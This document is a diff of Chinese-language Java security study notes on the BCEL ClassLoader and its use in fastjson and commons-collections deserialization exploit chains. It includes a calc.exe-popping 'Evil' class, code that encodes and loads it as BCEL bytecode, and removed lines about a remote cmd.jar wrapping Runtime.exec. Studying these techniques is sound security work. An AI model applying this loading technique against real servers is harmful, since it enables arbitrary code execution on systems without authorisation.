+- 其实Java里很多东西是有因果的，`TemplatesImpl`是对JAXP标准中`javax.xml.transform.Templates`接口的实现，前文说了，XSLT在使用时会先编译成Java字节码，这也就是为什么`TemplatesImpl`会使用`defineClass`的原因。
+- 关于XSLT这块的内容比较多，不是本文的重点，我就不细说了。那么这部分内容和BCEL有什么关系呢？
+- 你应该也能猜到了，**因为需要“编译”XSL文件，实际上核心是动态生成Java字节码，而BCEL正是一个处理字节码的库，所以Apache Xalan是依赖BCEL的。**
+
+#### BCEL ClassLoader如何使用
+
+- BCEL这个包中有个有趣的类`com.sun.org.apache.bcel.internal.util.ClassLoader`，他是一个ClassLoader，但是他重写了Java内置的`ClassLoader#loadClass()`方法。
+
+- 在`ClassLoader#loadClass()`中，其会判断类名是否是`$$BCEL$$`开头，如果是的话，将会对这个字符串进行decode。具体算法在这里：
+
+    - ```java
+          private static class JavaWriter extends FilterWriter {
+            public JavaWriter(Writer out) {
+              super(out);
+            }
+        
+            public void write(int b) throws IOException {
+              if(isJavaIdentifierPart((char)b) && (b != ESCAPE_CHAR)) {
+                out.write(b);
+              } else {
+                out.write(ESCAPE_CHAR); // Escape character
+        
+                // Special escape
+                if(b >= 0 && b < FREE_CHARS) {
+                  out.write(CHAR_MAP[b]);
+                } else { // Normal escape
+                  char[] tmp = Integer.toHexString(b).toCharArray();
+        
+                  if(tmp.length == 1) {
+                    out.write('0');
+                    out.write(tmp[0]);
+                  } else {
+                    out.write(tmp[0]);
+                    out.write(tmp[1]);
+                  }
+                }
               }
-              // 输出命令执行结果
-              System.out.println(baos.toString());
-          } catch (Exception e) {
-              e.printStackTrace();
+            }
+        
+            public void write(char[] cbuf, int off, int len) throws IOException {
+              for(int i=0; i < len; i++)
+                write(cbuf[off + i]);
+            }
+        
+            public void write(String str, int off, int len) throws IOException {
+              write(str.toCharArray(), off, len);
+            }
           }
-      }
-  }
-  ```
-  
-- 执行结果，弹出计算器。
-- 远程的cmd.jar中就一个CMD.class文件，对应的编译之前的代码片段如下：
+        ```
 
-  ```java
-  import java.io.IOException;
-  /**
-  * Creator: yz
-  * Date: 2019/12/18
-  */
-  public class CMD {
-  	public static Process exec(String cmd) throws IOException {
-  		return Runtime.getRuntime().exec(cmd);
-  	}
-  }
-  
-  ```
+- **基本可以理解为是传统字节码的HEX编码，再将反斜线替换成`$`。默认情况下外层还会加一层GZip压缩。**
+
+#### BCEL 去哪了
+
+- 同样的代码，如果在Java 8u261下执行，则会出现一个异常：
+
+- 查看原因，发现是`com.sun.org.apache.bcel.internal.util.ClassLoader`这个类不在了，查看源码确实没有了。
+
+- 翻一下Java的更新日志，可以发现在8u251的时候，曾有过一个BCEL相关的更新：https://www.oracle.com/java/technologies/javase/8u251-bugfixes.html
+
+- 其实就是把BCEL的依赖升级到6.0了。难道是BCEL 6.0之后这个ClassLoader被删除了吗？
+
+    登录[Apache Commons BCEL官网](https://commons.apache.org/proper/commons-bcel/)，下载了多个6.x的代码，发现ClassLoader都是存在的
+
+- 所以你在官网里下载的BCEL中，ClassLoader是存在的。
+
+- 那么为什么Java内的ClassLoader没有了呢？我觉得只有两个可能性：
+
+    - Java在升级BCEL的时候注意到了前面那个issue，并参考它的修复方式重新将ClassLoader删除了
+    - Java将BCEL升级到6.0时用的是一个删除了ClassLoader版本的BCEL（但无法解释为何命名空间不是bcel6）
+    - 即便是用到了BCEL6也没用，因为BCEL这个特性仅适用于BCEL 6.0以下，因为从6.0开始`org.apache.bcel.classfile.ConstantUtf8#setBytes`就已经过时了
+
+- 所以，很遗憾，**在Java 8u251以后，BCEL无法使用了**。所以，之后测试fastjson反序列化，记得这里有个坑。
+
+#### BCEL的使用
+
+- 先创建一个恶意类
+
+    - ```java
+        public class Evil {
+            static {
+                try {
+                    Runtime.getRuntime().exec("calc.exe");
+                } catch (Exception e) {}
+            }
+        }
+        ```
+
+- 然后将Evil生成BCEL形式的字节码。使用这个字节码来新建对象，将会调用到计算器：
+
+    - 我们可以通过BCEL提供的两个类 `Repository` 和 `Utility` 来利用：
+
+        -  Repository 用于将一个Java Class 先转换成原生字节码，当然这里也可以直接使用javac命令来编译java文件生成字节码； 
+        - Utility 用于将 **原生的字节码转换成BCEL格式的字节码**：
+
+    - ```java
+        import com.sun.org.apache.bcel.internal.classfile.JavaClass;
+        import com.sun.org.apache.bcel.internal.classfile.Utility;
+        import com.sun.org.apache.bcel.internal.Repository;
+        import com.sun.org.apache.bcel.internal.util.ClassLoader;
+        public class HelloBCEL {
+            public static void main(String []args) throws Exception {
+                JavaClass cls = Repository.lookupClass(Evil.class);
+                String code = Utility.encode(cls.getBytes(), true);
+                
+                //添加$$BCEL$$前缀
+                code = "$$BCEL$$"+code;
+                System.out.println(code);
+                
+                //加载bcel字节码
+                new ClassLoader().loadClass(code).newInstance();
+            }
+        }
+        ```
+
+    - 同样不会类初始化，需要自己显示调用。
+
+- BCEL ClassLoader在Fastjson等漏洞的利用链构造时都有被用到，其实这个类和前面的 TemplatesImpl 都出自于同一个第三方库，Apache Xalan。但在Java 8u251的更新中，这个ClassLoader被移除了，所以之后只能 且用且珍惜了。
 
 ## 反射机制
 
@@ -1782,7 +2198,9 @@
 
     - 如果我们增加一个 ConstantTransformer(1) 在TransformChain的末尾，异常信息将会变成 `java.lang.Integer cannot be cast to java.util.Set` ，隐蔽了启动进程的日志特征：
 
-### 其他cc链
+### 其他利用链
+
+#### URLDNS—反序列化检测链
 
 #### cc6—高jdk版本可用
 
@@ -3321,6 +3739,7 @@ public class Test {
 ##### fastjson不出网如何利用
 
 - https://www.cnblogs.com/R0ser1/p/15918626.html#%E5%89%8D%E8%A8%80
+- BCEL可以
 
 ##### 1.2.25-1.2.41
 
